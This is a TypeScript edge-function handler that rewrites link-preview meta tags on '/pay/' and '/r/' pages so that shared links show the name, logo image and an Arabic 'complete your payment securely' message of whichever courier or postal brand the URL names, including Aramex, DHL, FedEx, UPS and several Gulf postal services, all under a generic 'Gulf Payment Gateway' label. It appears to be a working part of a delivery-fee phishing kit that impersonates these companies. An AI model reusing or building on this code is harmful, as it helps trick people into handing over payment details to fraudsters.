export default async function handler(request: Request, context: { next: () => Promise<Response> }) {
  try {
    const url = new URL(request.url);
    const company = url.searchParams.get('company') || 'aramex';
    const path = url.pathname;

    if (!path.startsWith('/pay/') && !path.startsWith('/r/')) {
      return context.next();
    }

    const response = await context.next();
    const html = await response.text();
    const origin = url.origin;

    const companyImages: Record<string, string> = {
      'aramex': `${origin}/og-aramex.jpg`,
      'dhl': `${origin}/og-dhl.jpg`,
      'dhlkw': `${origin}/og-dhl.jpg`,
      'dhlqa': `${origin}/og-dhl.jpg`,
      'dhlom': `${origin}/og-dhl.jpg`,
      'dhlbh': `${origin}/og-dhl.jpg`,
      'fedex': `${origin}/og-fedex.jpg`,
      'ups': `${origin}/og-ups.jpg`,
      'empost': `${origin}/og-empost.jpg`,
      'smsa': `${origin}/og-smsa.jpg`,
      'zajil': `${origin}/og-zajil.jpg`,
      'naqel': `${origin}/og-naqel.jpg`,
      'saudipost': `${origin}/og-saudipost.jpg`,
      'kwpost': `${origin}/og-kwpost.jpg`,
      'qpost': `${origin}/og-qpost.jpg`,
      'omanpost': `${origin}/og-omanpost.jpg`,
      'bahpost': `${origin}/og-bahpost.jpg`,
      'jinakum': `${origin}/og-jinakum.jpg`,
      'jinaken': `${origin}/og-jinaken.jpg`,
      'albaraka': `${origin}/og-albaraka.jpg`,
      'alfuttaim': `${origin}/og-alfuttaim.jpg`,
      'alshaya': `${origin}/og-alshaya.jpg`,
      'bahri': `${origin}/og-bahri.jpg`,
      'dsv': `${origin}/og-dsv.jpg`,
      'genacom': `${origin}/og-genacom.jpg`,
      'hellmann': `${origin}/og-hellmann.jpg`,
      'shipco': `${origin}/og-shipco.jpg`,
      'payment': `${origin}/og-aramex.jpg`
    };

    const companyNamesAr: Record<string, string> = {
      'aramex': 'أرامكس',
      'dhl': 'دي إتش إل',
      'dhlkw': 'دي إتش إل الكويت',
      'dhlqa': 'دي إتش إل قطر',
      'dhlom': 'دي إتش إل عُمان',
      'dhlbh': 'دي إتش إل البحرين',
      'fedex': 'فيديكس',
      'ups': 'يو بي إس',
      'empost': 'البريد الإماراتي',
      'smsa': 'سمسا إكسبريس',
      'zajil': 'زاجل إكسبريس',
      'naqel': 'ناقل إكسبريس',
      'saudipost': 'البريد السعودي',
      'kwpost': 'البريد الكويتي',
      'qpost': 'البريد القطري',
      'omanpost': 'البريد العُماني',
      'bahpost': 'البريد البحريني',
      'jinakum': 'شركة جناكم',
      'jinaken': 'شركة جناكن',
      'albaraka': 'مجموعة البركة',
      'alfuttaim': 'مجموعة الفطيم',
      'alshaya': 'مجموعة الشايع',
      'bahri': 'البحري للنقل',
      'dsv': 'دي إس في',
      'genacom': 'جيناكوم',
      'hellmann': 'هيلمان اللوجستية',
      'shipco': 'شيبكو للنقل',
      'payment': 'خدمة الدفع'
    };

    const companyDescriptions: Record<string, string> = {
      'aramex': 'أكمل دفع شحنة أرامكس بشكل آمن',
      'dhl': 'ادفع خدمات شحن دي إتش إل',
      'dhlkw': 'ادفع خدمات دي إتش إل الكويت',
      'dhlqa': 'ادفع خدمات دي إتش إل قطر',
      'dhlom': 'ادفع خدمات دي إتش إل عُمان',
      'dhlbh': 'ادفع خدمات دي إتش إل البحرين',
      'fedex': 'أكمل دفع فيديكس عبر الإنترنت',
      'ups': 'ادفع خدمات شحن يو بي إس',
      'empost': 'ادفع خدمات البريد الإماراتي',
      'smsa': 'ادفع شحنات سمسا إكسبريس',
      'zajil': 'ادفع خدمات زاجل إكسبريس',
      'naqel': 'ادفع شحنات ناقل إكسبريس',
      'saudipost': 'ادفع خدمات البريد السعودي',
      'kwpost': 'ادفع خدمات البريد الكويتي',
      'qpost': 'ادفع خدمات البريد القطري',
      'omanpost': 'ادفع خدمات البريد العُماني',
      'bahpost': 'ادفع خدمات البريد البحريني',
      'jinakum': 'ادفع خدمات شركة جناكم',
      'jinaken': 'ادفع خدمات شركة جناكن',
      'albaraka': 'ادفع خدمات مجموعة البركة',
      'alfuttaim': 'ادفع خدمات مجموعة الفطيم',
      'alshaya': 'ادفع خدمات مجموعة الشايع',
      'bahri': 'ادفع خدمات البحري للنقل',
      'dsv': 'ادفع خدمات دي إس في اللوجستية',
      'genacom': 'ادفع خدمات جيناكوم',
      'hellmann': 'ادفع خدمات هيلمان اللوجستية',
      'shipco': 'ادفع خدمات شيبكو للنقل',
      'payment': 'أكمل عملية الدفع بشكل آمن'
    };

    const ogImage = companyImages[company.toLowerCase()] || `${origin}/og-aramex.jpg`;
    const companyNameAr = companyNamesAr[company.toLowerCase()] || company;
    const companyDescription = companyDescriptions[company.toLowerCase()] || 'إكمال عملية الدفع';

    const ogTitle = `${companyNameAr} - إكمال الدفع`;
    const ogDescription = companyDescription;
    const ogUrl = url.href;

    const ogTags = `
    <meta property="og:type" content="website" />
    <meta property="og:url" content="${ogUrl}" />
    <meta property="og:title" content="${ogTitle}" />
    <meta property="og:description" content="${ogDescription}" />
    <meta property="og:image" content="${ogImage}" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:image:type" content="image/jpeg" />
    <meta property="og:image:alt" content="${companyNameAr} Payment Gateway" />
    <meta property="og:site_name" content="Gulf Payment Gateway" />
    <meta property="og:locale" content="ar_AR" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="${ogTitle}" />
    <meta name="twitter:description" content="${ogDescription}" />
    <meta name="twitter:image" content="${ogImage}" />
    <meta name="twitter:image:alt" content="${companyNameAr} Payment Gateway" />
    `;

    let modifiedHtml = html.replace(
      /<meta\s+(?:property|name)=["'](?:og|twitter):[^"']*["'][^>]*>\s*/gi,
      ''
    );

    modifiedHtml = modifiedHtml.replace(
      /<head[^>]*>/i,
      (match) => `${match}\n${ogTags.trim()}`
    );

    return new Response(modifiedHtml, {
      status: response.status,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'public, max-age=0, must-revalidate',
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'SAMEORIGIN'
      }
    });

  } catch (error) {
    console.error('OG Injector Error:', error);
    return context.next();
  }
}
